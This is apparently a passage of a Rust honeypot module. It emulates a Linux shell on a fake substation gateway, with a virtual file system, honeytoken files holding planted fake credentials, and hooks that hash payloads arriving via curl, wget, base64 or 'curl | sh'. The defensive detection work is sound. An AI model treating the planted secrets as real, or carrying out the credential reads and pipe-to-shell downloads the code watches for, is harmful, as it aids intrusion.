//! High Interaction Honeypot with stateful VFS and command interception.
//!
//! Emulates an interactive Linux terminal session (SSH/Telnet) with:
//! - Stateful in-memory Virtual File System (VFS) with realistic files
//! - Honeytokens triggering high-priority alerts on access
//! - Interactive command execution and terminal control (CR/LF, backspace)
//! - Payload capture and SHA-256 hash calculation (file redirection, curl, wget, base64)
//! - Strict anti-leak / stealth compliance (never leaks HoneyForge)

use crate::config::Params;
use crate::event::event_type;
use crate::session::Session;
use base64::Engine;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::collections::HashMap;

// ============================================================================
// Virtual File System (VFS)
// ============================================================================

#[derive(Clone, Debug)]
pub struct VfsFile {
    pub content: Vec<u8>,
    pub permissions: u32,
    pub owner: String,
    pub group: String,
    pub mtime: f64,
}

#[derive(Clone, Debug)]
pub struct VfsDir {
    pub permissions: u32,
    pub owner: String,
    pub group: String,
    pub mtime: f64,
}

#[derive(Clone, Debug)]
pub enum VfsNode {
    File(VfsFile),
    Directory(VfsDir),
}

#[derive(Clone, Debug)]
pub struct Vfs {
    pub nodes: HashMap<String, VfsNode>,
}

impl Default for Vfs {
    fn default() -> Self {
        Self::new()
    }
}

impl Vfs {
    pub fn new() -> Self {
        let mut vfs = Self {
            nodes: HashMap::new(),
        };
        vfs.init_default();
        vfs
    }

    pub fn init_default(&mut self) {
        // Root directory
        self.mkdir_p("/", 0o755, "root", "root");

        // Common Linux directories
        let dirs = [
            "/bin", "/sbin", "/usr", "/usr/bin", "/usr/sbin", "/usr/lib", "/usr/local",
            "/usr/local/bin", "/usr/local/sbin", "/etc", "/etc/scada", "/var", "/var/log",
            "/tmp", "/root", "/root/.ssh", "/home", "/home/operator", "/proc", "/dev",
            "/lib", "/lib64", "/sys", "/run", "/boot", "/mnt", "/opt",
        ];
        for d in &dirs {
            self.mkdir_p(d, 0o755, "root", "root");
        }

        // /tmp directory permissions (1777 sticky bit)
        if let Some(VfsNode::Directory(d)) = self.nodes.get_mut("/tmp") {
            d.permissions = 0o1777;
        }

        // Dummy executable binaries
        let dummy_elf = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00";
        for bin in &["/bin/sh", "/bin/bash", "/bin/ls", "/bin/cat", "/bin/ps", "/bin/uname"] {
            self.write_file(bin, dummy_elf.to_vec(), 0o755, "root", "root");
        }
        for ubin in &["/usr/bin/curl", "/usr/bin/wget", "/usr/bin/python3", "/usr/bin/grep", "/usr/bin/head", "/usr/bin/tail", "/usr/bin/base64"] {
            self.write_file(ubin, dummy_elf.to_vec(), 0o755, "root", "root");
        }

        // /etc/passwd: realistic user accounts
        let passwd = "\
root:x:0:0:root:/root:/bin/bash\n\
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\
bin:x:2:2:bin:/bin:/usr/sbin/nologin\n\
sys:x:3:3:sys:/dev:/usr/sbin/nologin\n\
sync:x:4:65534:sync:/bin:/bin/sync\n\
games:x:5:60:games:/usr/games:/usr/sbin/nologin\n\
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n\
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n\
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n\
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n\
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n\
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n\
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n\
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n\
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n\
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n\
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n\
nobody:x:65534:65534::/nonexistent:/usr/sbin/nologin\n\
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n\
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n\
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n\
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin\n\
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n\
pollinate:x:105:1::/var/cache/pollinate:/bin/false\n\
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin\n\
syslog:x:107:113::/home/syslog:/usr/sbin/nologin\n\
operator:x:1000:1000::/home/operator:/bin/bash\n";
        self.write_file("/etc/passwd", passwd.as_bytes().to_vec(), 0o644, "root", "root");

        // /etc/hostname
        self.write_file("/etc/hostname", b"substation-gw01\n".to_vec(), 0o644, "root", "root");

        // /etc/os-release
        let os_release = "\
PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"\n\
NAME=\"Ubuntu\"\n\
VERSION_ID=\"22.04\"\n\
VERSION=\"22.04.3 LTS (Jammy Jellyfish)\"\n\
VERSION_CODENAME=jammy\n\
ID=ubuntu\n\
ID_LIKE=debian\n\
HOME_URL=\"https://www.ubuntu.com/\"\n\
SUPPORT_URL=\"https://help.ubuntu.com/\"\n\
BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\n\
PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\n\
UBUNTU_CODENAME=jammy\n";
        self.write_file("/etc/os-release", os_release.as_bytes().to_vec(), 0o644, "root", "root");

        // /etc/hosts
        let hosts = "127.0.0.1 localhost\n192.168.1.10 substation-gw01\n";
        self.write_file("/etc/hosts", hosts.as_bytes().to_vec(), 0o644, "root", "root");

        // /var/log/syslog: dummy log entries
        let syslog = "\
Oct 14 06:25:01 substation-gw01 CRON[1204]: (root) CMD (test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; })\n\
Oct 14 06:30:12 substation-gw01 systemd[1]: Starting Daily apt download activities...\n\
Oct 14 06:30:15 substation-gw01 systemd[1]: apt-daily.service: Deactivated successfully.\n\
Oct 14 06:30:15 substation-gw01 systemd[1]: Finished Daily apt download activities.\n\
Oct 14 07:15:22 substation-gw01 scada_agent[842]: [INFO] IEC-60870-5-104 Server listening on 0.0.0.0:2404\n\
Oct 14 07:15:22 substation-gw01 scada_agent[842]: [INFO] Modbus TCP Gateway listening on 0.0.0.0:502\n\
Oct 14 08:00:01 substation-gw01 systemd[1]: Starting Clean php session files...\n\
Oct 14 08:00:02 substation-gw01 systemd[1]: phpsessionclean.service: Deactivated successfully.\n\
Oct 14 09:12:44 substation-gw01 sshd[3142]: Accepted publickey for root from 192.168.1.105 port 52314 ssh2\n\
Oct 14 09:12:44 substation-gw01 systemd[1]: Started Session 42 of user root.\n";
        self.write_file("/var/log/syslog", syslog.as_bytes().to_vec(), 0o640, "syslog", "adm");

        // Honeytoken 1: /root/.env
        let env_secret = "API_KEY=hf_live_secret_994821a8f9\nDATABASE_URL=postgres://scada_adm:p@ssw0rd99@10.0.0.5:5432/scada_db\n";
        self.write_file("/root/.env", env_secret.as_bytes().to_vec(), 0o600, "root", "root");

        // Honeytoken 2: /root/.ssh/id_rsa
        let id_rsa = "\
-----BEGIN OPENSSH PRIVATE KEY-----\n\
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n\
NhAAAAAwEAAQAAAYEAw7R4q3kZ2e0hLp7nF3qK9M2v1xY5j8tL6nQ0w9rE8yU1i4oP3a\n\
sD5fG7hJkL9mN2bV6cXxZ1aQ8wE3rT5yU7iO9pA2sD4fG6hJ8kL0mN2bV4cXxZ6aQ8wE\n\
-----END OPENSSH PRIVATE KEY-----\n";
        self.write_file("/root/.ssh/id_rsa", id_rsa.as_bytes().to_vec(), 0o600, "root", "root");

        // Honeytoken 3: /etc/scada/plc_auth.conf
        let plc_auth = "PLC_SECRET_KEY=ABB_RTU_Master_Key_2026\n";
        self.write_file("/etc/scada/plc_auth.conf", plc_auth.as_bytes().to_vec(), 0o600, "root", "root");

        // /proc files
        self.write_file("/proc/version", b"Linux version 5.15.0-88-generic (buildd@lcy02-amd64-001) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023\n".to_vec(), 0o444, "root", "root");
        self.write_file("/proc/uptime", b"104857.42 209714.84\n".to_vec(), 0o444, "root", "root");

        // User bash files
        self.write_file("/root/.bashrc", b"# ~/.bashrc: executed by bash(1) for non-login shells.\nexport PS1='\\u@\\h:\\w\\$ '\n".to_vec(), 0o644, "root", "root");
        self.write_file("/root/.profile", b"# ~/.profile: executed by Bourne-compatible login shells.\n".to_vec(), 0o644, "root", "root");
        self.write_file("/home/operator/.bashrc", b"# ~/.bashrc: executed by bash(1) for non-login shells.\nexport PS1='\\u@\\h:\\w\\$ '\n".to_vec(), 0o644, "operator", "operator");
    }

    pub fn get_node(&self, path: &str) -> Option<&VfsNode> {
        let normalized = normalize_canonical(path);
        self.nodes.get(&normalized)
    }

    pub fn get_node_mut(&mut self, path: &str) -> Option<&mut VfsNode> {
        let normalized = normalize_canonical(path);
        self.nodes.get_mut(&normalized)
    }

    pub fn is_dir(&self, path: &str) -> bool {
        matches!(self.get_node(path), Some(VfsNode::Directory(_)))
    }

    pub fn is_file(&self, path: &str) -> bool {
        matches!(self.get_node(path), Some(VfsNode::File(_)))
    }

    pub fn read_file(&self, path: &str) -> Option<&[u8]> {
        match self.get_node(path) {
            Some(VfsNode::File(f)) => Some(&f.content),
            _ => None,
        }
    }

    pub fn write_file(&mut self, path: &str, content: Vec<u8>, permissions: u32, owner: &str, group: &str) {
        let norm = normalize_canonical(path);
        if let Some(parent) = parent_path(&norm) {
            if !self.is_dir(parent) {
                self.mkdir_p(parent, 0o755, owner, group);
            }
        }
        self.nodes.insert(
            norm,
            VfsNode::File(VfsFile {
                content,
                permissions,
                owner: owner.to_string(),
                group: group.to_string(),
                mtime: 1700000000.0,
            }),
        );
    }

    pub fn append_file(&mut self, path: &str, content: &[u8]) {
        let norm = normalize_canonical(path);
        if let Some(VfsNode::File(f)) = self.nodes.get_mut(&norm) {
            f.content.extend_from_slice(content);
            f.mtime = 1700000000.0;
        } else {
            self.write_file(&norm, content.to_vec(), 0o644, "root", "root");
        }
    }

    pub fn mkdir(&mut self, path: &str, permissions: u32, owner: &str, group: &str) -> Result<(), String> {
        let norm = normalize_canonical(path);
        if self.nodes.contains_key(&norm) {
            return Err("File exists".to_string());
        }
        if let Some(parent) = parent_path(&norm) {
            if !self.is_dir(parent) {
                return Err("No such file or directory".to_string());
            }
        }
        self.nodes.insert(
            norm,
            VfsNode::Directory(VfsDir {
                permissions,
                owner: owner.to_string(),
                group: group.to_string(),
                mtime: 1700000000.0,
            }),
        );
        Ok(())
    }

    pub fn mkdir_p(&mut self, path: &str, permissions: u32, owner: &str, group: &str) {
        let norm = normalize_canonical(path);
        if norm == "/" {
            if !self.nodes.contains_key("/") {
                self.nodes.insert(
                    "/".to_string(),
                    VfsNode::Directory(VfsDir {
                        permissions,
                        owner: owner.to_string(),
                        group: group.to_string(),
                        mtime: 1700000000.0,
                    }),
                );
            }
            return;
        }

        let parts: Vec<&str> = norm.split('/').filter(|s| !s.is_empty()).collect();
        let mut cur = String::new();
        for p in parts {
            cur.push('/');
            cur.push_str(p);
            if !self.nodes.contains_key(&cur) {
                self.nodes.insert(
                    cur.clone(),
                    VfsNode::Directory(VfsDir {
                        permissions,
                        owner: owner.to_string(),
                        group: group.to_string(),
                        mtime: 1700000000.0,
                    }),
                );
            }
        }
    }

    pub fn touch(&mut self, path: &str, owner: &str, group: &str) -> Result<(), String> {
        let norm = normalize_canonical(path);
        if let Some(parent) = parent_path(&norm) {
            if !self.is_dir(parent) {
                return Err("No such file or directory".to_string());
            }
        }
        if let Some(VfsNode::File(f)) = self.nodes.get_mut(&norm) {
            f.mtime = 1700000000.0;
        } else {
            self.write_file(&norm, Vec::new(), 0o644, owner, group);
        }
        Ok(())
    }

    pub fn rm(&mut self, path: &str, recursive: bool, force: bool) -> Result<(), String> {
        let norm = normalize_canonical(path);
        if !self.nodes.contains_key(&norm) {
            if force {
                return Ok(());
            }
            return Err("No such file or directory".to_string());
        }

        if self.is_dir(&norm) {
            if !recursive {
                return Err("Is a directory".to_string());
            }
            // Remove the directory itself and all descendants
            let prefix = if norm == "/" {
                "/".to_string()
            } else {
                format!("{}/", norm)
            };
            self.nodes.retain(|k, _| k != &norm && !k.starts_with(&prefix));
        } else {
            self.nodes.remove(&norm);
        }
        Ok(())
    }

    pub fn list_dir(&self, dir: &str) -> Option<Vec<String>> {
        let norm = normalize_canonical(dir);
        if !self.is_dir(&norm) {
            return None;
        }
        let prefix = if norm == "/" {
            "/".to_string()
        } else {
            format!("{}/", norm)
        };

        let mut names = Vec::new();
        for path in self.nodes.keys() {
            if path == &norm {
                continue;
            }
            if norm == "/" {
                if path.starts_with('/') && !path[1..].contains('/') {
                    names.push(path[1..].to_string());
                }
            } else if let Some(rest) = path.strip_prefix(&prefix) {
                if !rest.contains('/') {
                    names.push(rest.to_string());
                }
            }
        }
        names.sort();
        Some(names)
    }

    pub fn copy_node(&mut self, src: &str, dst: &str) -> Result<(), String> {
        let src_norm = normalize_canonical(src);
        let dst_norm = normalize_canonical(dst);

        let target_path = if self.is_dir(&dst_norm) {
            let fname = file_name(&src_norm);
            if dst_norm == "/" {
                format!("/{}", fname)
            } else {
                format!("{}/{}", dst_norm, fname)
            }
        } else {
            dst_norm
        };

        match self.get_node(&src_norm).cloned() {
            Some(VfsNode::File(f)) => {
                self.nodes.insert(target_path, VfsNode::File(f));
                Ok(())
            }
            Some(VfsNode::Directory(d)) => {
                self.nodes.insert(target_path.clone(), VfsNode::Directory(d));
                let prefix = format!("{}/", src_norm);
                let to_copy: Vec<(String, VfsNode)> = self.nodes.iter()
                    .filter(|(k, _)| k.starts_with(&prefix))
                    .map(|(k, v)| (k.clone(), v.clone()))
                    .collect();
                for (k, v) in to_copy {
                    let suffix = &k[prefix.len()..];
                    let new_k = format!("{}/{}", target_path, suffix);
                    self.nodes.insert(new_k, v);
                }
                Ok(())
            }
            None => Err("No such file or directory".to_string()),
        }
    }

    pub fn move_node(&mut self, src: &str, dst: &str) -> Result<(), String> {
        self.copy_node(src, dst)?;
        self.rm(src, true, true)?;
        Ok(())
    }
}

// ============================================================================
// Path Normalization Helpers
// ============================================================================

pub fn normalize_canonical(path: &str) -> String {
    normalize_path("/", path)
}

pub fn normalize_path(cwd: &str, path: &str) -> String {
    let raw = path.trim();
    if raw.is_empty() {
        return cwd.to_string();
    }
    let expanded = if raw == "~" {
        "/root".to_string()
    } else if let Some(rest) = raw.strip_prefix("~/") {
        format!("/root/{}", rest)
    } else {
        raw.to_string()
    };

    let is_absolute = expanded.starts_with('/');
    let mut parts: Vec<&str> = Vec::new();
    if !is_absolute {
        for seg in cwd.split('/') {
            if !seg.is_empty() {
                parts.push(seg);
            }
        }
    }

    for seg in expanded.split('/') {
        if seg.is_empty() || seg == "." {
            continue;
        } else if seg == ".." {
            parts.pop();
        } else {
            parts.push(seg);
        }
    }

    if parts.is_empty() {
        "/".to_string()
    } else {
        format!("/{}", parts.join("/"))
    }
}

pub fn parent_path(path: &str) -> Option<&str> {
    if path == "/" {
        return None;
    }
    match path.rfind('/') {
        Some(0) => Some("/"),
        Some(idx) => Some(&path[..idx]),
        None => None,
    }
}

pub fn file_name(path: &str) -> &str {
    if path == "/" {
        return "/";
    }
    match path.rfind('/') {
        Some(idx) => &path[idx + 1..],
        None => path,
    }
}

fn format_mode(mode: u32, is_dir: bool) -> String {
    let mut s = String::with_capacity(10);
    s.push(if is_dir { 'd' } else { '-' });
    s.push(if mode & 0o400 != 0 { 'r' } else { '-' });
    s.push(if mode & 0o200 != 0 { 'w' } else { '-' });
    s.push(if mode & 0o100 != 0 { 'x' } else { '-' });
    s.push(if mode & 0o040 != 0 { 'r' } else { '-' });
    s.push(if mode & 0o020 != 0 { 'w' } else { '-' });
    s.push(if mode & 0o010 != 0 { 'x' } else { '-' });
    s.push(if mode & 0o004 != 0 { 'r' } else { '-' });
    s.push(if mode & 0o002 != 0 { 'w' } else { '-' });
    s.push(if mode & 0o001 != 0 { 'x' } else { '-' });
    s
}

// ============================================================================
// Shell Parsing and Execution
// ============================================================================

pub struct ShellSession {
    pub vfs: Vfs,
    pub cwd: String,
    pub oldpwd: String,
    pub user: String,
    pub hostname: String,
    pub env: HashMap<String, String>,
    pub honeytokens: Vec<String>,
}

impl ShellSession {
    pub fn new(hostname: String, user: String, honeytokens: Vec<String>) -> Self {
        let cwd = if user == "root" {
            "/root".to_string()
        } else {
            format!("/home/{}", user)
        };
        let mut env = HashMap::new();
        env.insert("USER".to_string(), user.clone());
        env.insert("LOGNAME".to_string(), user.clone());
        env.insert("HOME".to_string(), cwd.clone());
        env.insert("SHELL".to_string(), "/bin/bash".to_string());
        env.insert("TERM".to_string(), "xterm-256color".to_string());
        env.insert("PATH".to_string(), "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".to_string());
        env.insert("LANG".to_string(), "en_US.UTF-8".to_string());
        env.insert("SHLVL".to_string(), "1".to_string());
        env.insert("PWD".to_string(), cwd.clone());
        env.insert("_".to_string(), "/usr/bin/env".to_string());

        Self {
            vfs: Vfs::new(),
            cwd: cwd.clone(),
            oldpwd: cwd,
            user,
            hostname,
            env,
            honeytokens,
        }
    }

    pub fn prompt(&self) -> String {
        let prompt_char = if self.user == "root" { '#' } else { '$' };
        let home = if self.user == "root" {
            "/root"
        } else {
            "/home/operator"
        };

        let cwd_display = if self.cwd == home {
            "~".to_string()
        } else if let Some(rest) = self.cwd.strip_prefix(home) {
            if rest.starts_with('/') {
                format!("~{}", rest)
            } else {
                self.cwd.clone()
            }
        } else {
            self.cwd.clone()
        };

        format!("{}@{}:{}{} ", self.user, self.hostname, cwd_display, prompt_char)
    }

    pub fn resolve_path(&self, path: &str) -> String {
        normalize_path(&self.cwd, path)
    }

    pub fn is_honeytoken(&self, path: &str) -> bool {
        let norm = normalize_canonical(path);
        self.honeytokens.iter().any(|h| normalize_canonical(h) == norm)
    }

    pub fn emit_honeytoken_event(&self, token_path: String, cmd: &str, s: &Session) {
        let alert_data = json!({
            "token_file": token_path,
            "command": cmd,
            "severity": "CRITICAL",
            "message": "Honeytoken accessed by attacker",
        });
        s.emit_data(event_type::TOKEN, alert_data.clone());
        s.emit_data("honeytoken_hit", alert_data);
    }

    pub fn execute_line(&mut self, line: &str, s: &Session) -> (String, bool) {
        let subcommands = split_command_chain(line);
        let mut total_output = String::new();
        let mut should_exit = false;

        for sub in subcommands {
            let (out, exit) = self.execute_subcommand(&sub, s);
            total_output.push_str(&out);
            if exit {
                should_exit = true;
                break;
            }
        }

        (total_output, should_exit)
    }

    fn execute_subcommand(&mut self, cmd_raw: &str, s: &Session) -> (String, bool) {
        let cmd = cmd_raw.trim();
        if cmd.is_empty() {
            return (String::new(), false);
        }

        if cmd == "exit" || cmd == "logout" || cmd == "quit" {
            s.emit_data(event_type::COMMAND, json!({ "command": cmd, "cwd": self.cwd }));
            return ("logout\n".to_string(), true);
        }

        // Check for redirection: > or >>
        if let Some(redir) = parse_redirection(cmd) {
            let (out_str, exit) = self.execute_pipeline(&redir.left_cmd, s);
            let target_path = self.resolve_path(&redir.target_file);
            let out_bytes = out_str.as_bytes();

            if redir.append {
                self.vfs.append_file(&target_path, out_bytes);
            } else {
                self.vfs.write_file(&target_path, out_bytes.to_vec(), 0o644, &self.user, &self.user);
            }

            // Calculate payload SHA-256 and emit payload & command events
            let hash = compute_sha256(out_bytes);
            let size = out_bytes.len();
            let sample = truncate_sample(out_bytes, 200);

            let payload_data = json!({
                "command": cmd,
                "payload_sha256": hash,
                "payload_size": size,
                "payload_sample": sample,
            });
            s.emit_data(event_type::COMMAND, payload_data.clone());
            s.emit_data(event_type::PAYLOAD, payload_data);

            return (String::new(), exit);
        }

        self.execute_pipeline(cmd, s)
    }

    fn execute_pipeline(&mut self, cmd_raw: &str, s: &Session) -> (String, bool) {
        let stages = split_pipeline(cmd_raw);
        let mut current_input = String::new();
        let mut exit = false;

        for (idx, stage) in stages.iter().enumerate() {
            let is_last = idx + 1 == stages.len();
            let (out, st_exit) = self.execute_single_command(stage, &current_input, is_last, s);
            current_input = out;
            if st_exit {
                exit = true;
                break;
            }
        }

        (current_input, exit)
    }

    fn execute_single_command(&mut self, cmd: &str, stdin: &str, is_last_pipe: bool, s: &Session) -> (String, bool) {
        let expanded = self.expand_vars(cmd);
        let words = tokenize_words(&expanded);
        if words.is_empty() {
            return (String::new(), false);
        }

        let cmd_name = words[0].as_str();

        // Honeytoken Access Detection for reading commands
        let read_commands = [
            "cat", "head", "tail", "grep", "more", "less", "cp", "strings",
            "view", "nano", "vi", "vim", "base64", "awk", "sed", "dd",
        ];

        let mut token_hit_detected: Option<String> = None;
        if read_commands.contains(&cmd_name) {
            for arg in &words[1..] {
                if !arg.starts_with('-') {
                    let norm = self.resolve_path(arg);
                    if self.is_honeytoken(&norm) {
                        token_hit_detected = Some(norm);
                        break;
                    }
                }
            }
            if token_hit_detected.is_none() {
                for ht in &self.honeytokens {
                    if cmd.contains(ht) {
                        token_hit_detected = Some(ht.clone());
                        break;
                    }
                }
            }
        }

        if let Some(token_path) = token_hit_detected {
            self.emit_honeytoken_event(token_path, cmd, s);
        }

        let mut payload_emitted = false;
        let mut should_exit = false;

        let output = match cmd_name {
            "pwd" => format!("{}\n", self.cwd),
            "cd" => self.handle_cd(&words),
            "ls" => self.handle_ls(&words),
            "cat" => self.handle_cat(&words, stdin),
            "echo" => self.handle_echo(&words),
            "touch" => self.handle_touch(&words),
            "mkdir" => self.handle_mkdir(&words),
            "rm" => self.handle_rm(&words),
            "head" => self.handle_head(&words, stdin),
            "tail" => self.handle_tail(&words, stdin),
            "cp" => self.handle_cp(&words),
            "mv" => self.handle_mv(&words),
            "grep" => self.handle_grep(&words, stdin),
            "uname" => self.handle_uname(&words),
            "whoami" => format!("{}\n", self.user),
            "id" => self.handle_id(),
            "hostname" => format!("{}\n", self.hostname),
            "uptime" => " 12:34:56 up 1 day,  4:12,  1 user,  load average: 0.08, 0.03, 0.01\n".to_string(),
            "date" => "Wed Oct 14 12:34:56 UTC 2026\n".to_string(),
            "ip" => self.handle_ip(&words),
            "ifconfig" => self.handle_ifconfig(),
            "netstat" | "ss" => self.handle_netstat(),
            "route" => self.handle_route(),
            "ps" => self.handle_ps(),
            "top" => self.handle_top(),
            "wget" => {
                payload_emitted = true;
                self.handle_wget(&words, cmd, s)
            }
            "curl" => {
                let (out, emitted) = self.handle_curl(&words, cmd, is_last_pipe, s);
                payload_emitted = emitted;
                out
            }
            "base64" => {
                let (out, emitted) = self.handle_base64(&words, stdin, cmd, s);
                if emitted {
                    payload_emitted = true;
                }
                out
            }
            "chmod" => self.handle_chmod(&words),
            "chown" => self.handle_chown(&words),
            "export" => self.handle_export(&words),
            "env" | "printenv" => self.handle_env(),
            "which" => self.handle_which(&words),
            "whereis" => self.handle_whereis(&words),
            "sh" | "bash" => {
                // Pipe into shell execution simulation (e.g. curl ... | sh)
                if !stdin.is_empty() {
                    let hash = compute_sha256(stdin.as_bytes());
                    let size = stdin.len();
                    let sample = truncate_sample(stdin.as_bytes(), 200);
                    let p_data = json!({
                        "command": cmd,
                        "payload_sha256": hash,
                        "payload_size": size,
                        "payload_sample": sample,
                    });
                    s.emit_data(event_type::COMMAND, p_data.clone());
                    s.emit_data(event_type::PAYLOAD, p_data);
                    payload_emitted = true;
                }
                String::new()
            }
            "clear" => "\x1b[H\x1b[2J".to_string(),
            "true" | ":" => String::new(),
            "false" => String::new(),
            "exit" | "logout" | "quit" => {
                should_exit = true;
                "logout\n".to_string()
            }
            other => {
                // Check if path to existing file in VFS
                let norm = self.resolve_path(other);
                if self.vfs.is_file(&norm) {
                    // Executing a script/binary in VFS
                    String::new()
                } else {
                    format!("bash: {}: command not found\n", other)
                }
            }
        };

        if !payload_emitted {
            s.emit_data(event_type::COMMAND, json!({ "command": cmd, "cwd": self.cwd }));
        }

        (output, should_exit)
    }

    fn expand_vars(&self, s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        let mut chars = s.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '$' {
                if chars.peek() == Some(&'(') {
                    chars.next();
                    let mut inner = String::new();
                    while let Some(&ic) = chars.peek() {
                        chars.next();
                        if ic == ')' {
                            break;
                        }
                        inner.push(ic);
                    }
                    match inner.as_str() {
                        "whoami" => out.push_str(&self.user),
                        "hostname" => out.push_str(&self.hostname),
                        "pwd" => out.push_str(&self.cwd),
                        _ => {},
                    }
                } else {
                    let mut var_name = String::new();
                    while let Some(&vc) = chars.peek() {
                        if vc.is_alphanumeric() || vc == '_' {
                            var_name.push(vc);
                            chars.next();
                        } else {
                            break;
                        }
                    }
                    if let Some(val) = self.env.get(&var_name) {
                        out.push_str(val);
                    } else {
                        match var_name.as_str() {
                            "USER" => out.push_str(&self.user),
                            "HOME" => out.push_str(if self.user == "root" { "/root" } else { "/home/operator" }),
                            "PWD" => out.push_str(&self.cwd),
                            "HOSTNAME" => out.push_str(&self.hostname),
                            _ => {},
                        }
                    }
                }
            } else {
                out.push(c);
            }
        }
        out
    }

    fn handle_cd(&mut self, words: &[String]) -> String {
        let target = if words.len() <= 1 || words[1] == "~" {
            if self.user == "root" { "/root".to_string() } else { "/home/operator".to_string() }
        } else if words[1] == "-" {
            let prev = self.oldpwd.clone();
            let _ = prev.clone();
            prev
        } else {
            self.resolve_path(&words[1])
        };

        match self.vfs.get_node(&target) {
            None => format!("bash: cd: {}: No such file or directory\n", words.get(1).map(|s| s.as_str()).unwrap_or("")),
            Some(VfsNode::File(_)) => format!("bash: cd: {}: Not a directory\n", words.get(1).map(|s| s.as_str()).unwrap_or("")),
            Some(VfsNode::Directory(_)) => {
                self.oldpwd = self.cwd.clone();
                self.cwd = target.clone();
                self.env.insert("PWD".to_string(), target.clone());
                self.env.insert("OLDPWD".to_string(), self.oldpwd.clone());
                if words.len() > 1 && words[1] == "-" {
                    format!("{}\n", target)
                } else {
                    String::new()
                }
            }
        }
    }

    fn handle_ls(&self, words: &[String]) -> String {
        let mut show_all = false;
        let mut long_format = false;
        let mut one_per_line = false;
        let mut targets = Vec::new();

        for w in &words[1..] {
            if w.starts_with('-') && w.len() > 1 && !w.starts_with("--") {
                for c in w[1..].chars() {
                    match c {
                        'a' => show_all = true,
                        'l' => long_format = true,
                        '1' => one_per_line = true,
                        _ => {},
                    }
                }
            } else if w == "--all" {
                show_all = true;
            } else {
                targets.push(w.as_str());
            }
        }

        if targets.is_empty() {
            targets.push(".");
        }

        let mut out = String::new();
        let multiple = targets.len() > 1;

        for (i, t) in targets.iter().enumerate() {
            let norm = self.resolve_path(t);
            if multiple {
                if i > 0 {
                    out.push('\n');
                }
                out.push_str(&format!("{}:\n", t));
            }

            match self.vfs.get_node(&norm) {
                None => {
                    out.push_str(&format!("ls: cannot access '{}': No such file or directory\n", t));
                }
                Some(VfsNode::File(f)) => {
                    if long_format {
                        let mode = format_mode(f.permissions, false);
                        out.push_str(&format!("{} 1 {} {} {:>5} Oct 14 06:25 {}\n", mode, f.owner, f.group, f.content.len(), t));
                    } else {
                        out.push_str(&format!("{}\n", t));
                    }
                }
                Some(VfsNode::Directory(_)) => {
                    let mut entries = self.vfs.list_dir(&norm).unwrap_or_default();
                    if show_all {
                        entries.insert(0, "..".to_string());
                        entries.insert(0, ".".to_string());
                    } else {
                        entries.retain(|e| !e.starts_with('.'));
                    }

                    if long_format {
                        let total_blocks = entries.len() * 4;
                        out.push_str(&format!("total {}\n", total_blocks));
                        for e in entries {
                            let entry_path = if e == "." {
                                norm.clone()
                            } else if e == ".." {
                                parent_path(&norm).unwrap_or("/").to_string()
                            } else if norm == "/" {
                                format!("/{}", e)
                            } else {
                                format!("{}/{}", norm, e)
                            };

                            let (mode, owner, group, size) = match self.vfs.get_node(&entry_path) {
                                Some(VfsNode::Directory(d)) => (format_mode(d.permissions, true), d.owner.as_str(), d.group.as_str(), 4096),
                                Some(VfsNode::File(f)) => (format_mode(f.permissions, false), f.owner.as_str(), f.group.as_str(), f.content.len()),
                                None => ("-rw-r--r--".to_string(), "root", "root", 0),
                            };
                            let links = if mode.starts_with('d') { 2 } else { 1 };
                            out.push_str(&format!("{} {} {} {} {:>5} Oct 14 06:25 {}\n", mode, links, owner, group, size, e));
                        }
                    } else if one_per_line || entries.len() <= 1 {
                        for e in entries {
                            out.push_str(&format!("{}\n", e));
                        }
                    } else {
                        out.push_str(&entries.join("  "));
                        out.push('\n');
                    }
                }
            }
        }

        out
    }

    fn handle_cat(&self, words: &[String], stdin: &str) -> String {
        let mut files = Vec::new();
        for w in &words[1..] {
            if !w.starts_with('-') {
                files.push(w.as_str());
            }
        }
        if files.is_empty() || (files.len() == 1 && files[0] == "-") {
            return stdin.to_string();
        }

        let mut out = String::new();
        for f in files {
            let norm = self.resolve_path(f);
            match self.vfs.get_node(&norm) {
                None => {
                    out.push_str(&format!("cat: {}: No such file or directory\n", f));
                }
                Some(VfsNode::Directory(_)) => {
                    out.push_str(&format!("cat: {}: Is a directory\n", f));
                }
                Some(VfsNode::File(file)) => {
                    out.push_str(&String::from_utf8_lossy(&file.content));
                }
            }
        }
        out
    }

    fn handle_echo(&self, words: &[String]) -> String {
        let mut no_newline = false;
        let mut args = Vec::new();

        for w in &words[1..] {
            if w == "-n" && args.is_empty() {
                no_newline = true;
            } else {
                args.push(w.as_str());
            }
        }

